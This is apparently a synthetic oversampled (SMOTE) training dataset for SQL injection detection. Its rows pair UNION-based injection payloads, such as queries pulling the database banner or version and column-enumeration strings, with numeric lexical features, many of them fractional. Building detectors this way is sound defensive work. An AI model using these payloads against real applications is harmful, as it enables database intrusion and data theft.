id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,0.24330152783077047,101.88946327316783,25.110536726832162,4.032543686135593,65.55785309267135,4.110536726832159,24.11053672683216,8.110536726832162,0.6433892874610174,0.04035302786295952,0.23664605198804622,0.07961163268797687,0.0,0.0,2.0,0.0,1.8894632731678387,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.110536726832161,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000012,attack,union,"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",nearest_attack_euclidean,R000110,0.05608739493569326,107.58354351605806,28.08329129678839,3.9560938557976004,29.0,47.666834812846446,15.0,15.916708703211611,0.2696042105388634,0.44300683845888433,0.13945045372699832,0.14793849727525396,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.9167087032116115,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000013,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000072,0.11655167569403223,66.81359501803372,20.0,3.6254611460701813,14.0,36.65087601442698,4.0,12.162719003606744,0.20969049717190097,0.5483714033937188,0.05991157062054314,0.18202652881383707,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,7.1627190036067425,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000045,0.1302113773105137,100.7593210496568,28.0,3.685012509723239,25.0,40.60745683972545,22.0,13.151864209931361,0.24827427034168909,0.4027611674532975,0.2184813579006864,0.13048320430432706,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,6.151864209931362,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000015,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000066,0.20543051289602282,105.63078279978868,31.495373760169063,4.377348422530818,37.0,36.50462623983094,17.0,15.126156559957735,0.35036026289245187,0.3454785778692516,0.16097633700464006,0.14318482223365644,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.126156559957734,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000016,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,0.03926865255432245,92.70598836467323,27.0,4.033362021049219,25.0,39.76479069173858,16.0,11.941197672934646,0.26989988081943866,0.4286177639924524,0.17273592372444077,0.12874643146366818,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.941197672934647,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000017,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000035,0.7543472415069493,102.6883876096521,26.0,4.073912055394524,63.37677521930419,4.311612390347904,24.344193804826048,10.655806195173952,0.6170579789376506,0.04207602995543225,0.2370462354318068,0.10381975567511031,3.0,0.0,2.0,0.0,1.655806195173952,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.655806195173952,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000018,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,1.007759682220589,101.45784528235092,25.54215471764908,4.031025690216921,63.83138112940368,4.54215471764908,24.54215471764908,8.54215471764908,0.6290606762341306,0.04479405941281328,0.2419250140190045,0.08422025033405153,0.0,0.0,2.0,0.0,1.4578452823509198,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.54215471764908,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000019,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,0.29151179282347117,81.2225595256713,27.0,4.124545452393373,29.0,25.77804762053704,15.0,11.444511905134261,0.3573757947190374,0.3169265119659908,0.18484954899260556,0.14084814432236623,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.4445119051342603,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000020,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000063,0.4642065665201385,49.82050813551936,20.0,3.8549186031106086,14.0,23.05640650841549,4.0,8.764101627103871,0.29291313794778223,0.4485042344626613,0.08368946798508063,0.1748931596044758,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,3.7641016271038716,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000021,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.22434298443627892,76.0,33.0,4.439993102099514,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.33930229966135,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000022,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000127,0.35697147320098244,113.0437732830809,26.782490686767638,3.751475697547419,25.0,50.435018626464725,22.0,15.608754656616181,0.2212573650531998,0.44598821591488036,0.19470648124681583,0.13804793778510405,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.608754656616181,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000023,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,0.4474053577506278,89.97817589556277,26.79127035822511,3.9874577719556585,25.0,37.58254071645022,16.0,11.395635179112555,0.2780480941606709,0.41740582243491686,0.1779507802628294,0.12659530314158288,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.3956351791125545,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000154,0.726502980400352,105.37801997886848,29.0,4.005094765209661,30.729469075540717,44.0,15.432367268885178,15.21618363444259,0.2908510249866724,0.4182734730820803,0.14638592480089815,0.14448957713034913,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,3.2161836344425896,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.21618363444258948,2.0,1.0,1.0,0.21618363444258945,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.216183634442589
SMOTE_000025,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000132,0.10743245466442126,60.68668221257472,24.93133177874253,4.180592605682704,27.0,16.54934577005978,11.0,6.137336442514945,0.4455856143477339,0.2718985311434265,0.18153487991944714,0.10098097458939248,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,2.137336442514945,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000009,2.6931358939216135,90.20967906940491,27.522332379276545,3.8821580901030397,45.34367334506419,3.0,28.82134096578764,13.04466475855309,0.5024622042305332,0.03342795321450481,0.3179615444760725,0.14614829807888938,1.5669971378296346,1.5223323792765449,2.0,0.0,1.0,1.0,0.0,2.9553352414469103,0.0,0.0,1.0,4.522332379276545,0.5223323792765449,1.0,1.0,0.47766762072345503,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000027,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.2686878114334278,45.42827255048165,19.0,3.812773077272755,14.0,20.34261804038532,4.0,7.08565451009633,0.31545644740602585,0.43947834582168477,0.0901304135445788,0.1549347932277106,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,3.0856545100963304,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000028,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000100,0.3960481486090753,63.89775875256638,21.526517250171093,3.9243258831793364,14.0,34.31820700205311,4.0,11.579551750513277,0.22219099030786485,0.5333708116305622,0.06348314008796138,0.18095505797361158,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,6.579551750513277,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000029,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000054,0.02487792443854508,90.13374612041575,30.026749224083147,4.31673269488263,37.0,24.106996896332596,17.0,12.026749224083149,0.41177107040800215,0.2658105032544837,0.1891921134307037,0.13322631290681047,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0267492240831495,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000030,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000141,0.402867743905921,53.430024623675116,22.24300246236751,4.013900757267941,27.0,9.944019698940092,11.0,5.486004924735024,0.5083218692255775,0.18248306257040944,0.20709409486967978,0.10210097333433321,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.4860049247350231,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000036,0.7852574982372287,114.8796886556919,26.858645910379458,3.864953369844321,64.28270817924108,5.71729182075892,35.16239683493298,9.71729182075892,0.5611510627624372,0.04957642124138112,0.3047973813831538,0.08447513461302787,0.0,0.0,2.0,0.0,1.0,2.8586459103794595,0.0,1.7172918207589196,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8586459103794598,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.8586459103794599,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.85864591037946
